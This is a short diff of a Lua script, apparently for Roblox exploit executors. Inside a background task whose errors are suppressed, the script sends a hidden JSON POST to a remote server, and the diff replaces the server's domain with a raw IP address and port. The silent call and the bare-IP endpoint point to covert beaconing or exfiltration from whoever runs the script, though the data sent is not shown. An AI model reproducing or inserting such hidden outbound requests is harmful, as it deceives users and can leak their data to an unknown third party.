@@ -34,7 +34,7 @@ if Abysall.Environment.identifyexecutor and Abysall.Environment.request then
     task.spawn(function()
         pcall(function()
             Abysall.Environment.request({
-                Url = "http://alpha-site.xyz:10577/send",
+                Url = "http://93.115.101.180:10577/send",
                 Method = "POST",
                 Headers = {
                     ["content-type"] = "application/json"
